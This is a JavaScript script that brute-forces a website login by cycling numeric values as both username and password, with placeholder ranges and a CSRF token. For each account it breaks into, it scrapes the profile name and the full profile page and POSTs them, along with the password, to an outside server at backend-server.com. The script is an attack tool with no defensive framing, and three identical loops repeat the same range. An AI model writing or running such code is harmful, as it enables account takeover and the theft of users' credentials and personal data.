async function attemptLogin(passW, csrfToken) {
  try {
    const response = await fetch("https://example.com/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: `_method=POST&_csrfToken=${csrfToken}&username=${passW}&password=${passW}&_Token%5Bfields%5D=example%3A&_Token%5Bunlocked%5D=`
    });

    if (response.ok) {
      const htmlResponse = await response.text();
      const parser = new DOMParser();
      const doc = parser.parseFromString(htmlResponse, 'text/html');

      // Extracting profile name
      const profileNameElement = doc.querySelector('.user-menu .user-header p');
      const profileName = profileNameElement ? profileNameElement.textContent.trim() : 'Profile name not found';

      // Extracting password
      console.log(`Password: ${passW}, Profile Name: ${profileName}`);

      // Fetch data from "https://example.com/profile"
      const profilePageResponse = await fetch("https://example.com/profile");
      if (profilePageResponse.ok) {
        const profilePageHtml = await profilePageResponse.text();
        console.log("Profile Page HTML:", profilePageHtml);

        // Send data to the backend server
        const backendResponse = await fetch('https://backend-server.com/saveData', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            password: passW,
            profileName,
            profilePageHtml
          })
        });

        if (backendResponse.ok) {
          console.log('Data sent to the backend successfully');
        } else {
          console.error('Failed to send data to the backend');
        }
      } else {
        console.error(`Failed to fetch profile page data. Status: ${profilePageResponse.status}`);
      }
    } else {
      console.error(`Password: ${passW}, HTTP error! status: ${response.status}`);
    }
  } catch (error) {
    console.error(`Password: ${passW}, Error: `, error);
  }
}

async function loginAttempts() {
  try {
    // Replace with your CSRF Token and username ranges
    const csrfToken = 'YOUR_CSRF_TOKEN_HERE';

    // First range of passwords
    for (let passW = START_RANGE; passW <= END_RANGE; passW++) {
      await attemptLogin(passW, csrfToken);
    }

    // Second range of passwords
    for (let passW = START_RANGE; passW <= END_RANGE; passW++) {
      await attemptLogin(passW, csrfToken);
    }

    // Third range of passwords
    for (let passW = START_RANGE; passW <= END_RANGE; passW++) {
      await attemptLogin(passW, csrfToken);
    }
  } catch (error) {
    console.error("Error occurred: ", error);
  }
}

// Call the function to initiate login attempts
loginAttempts();

    
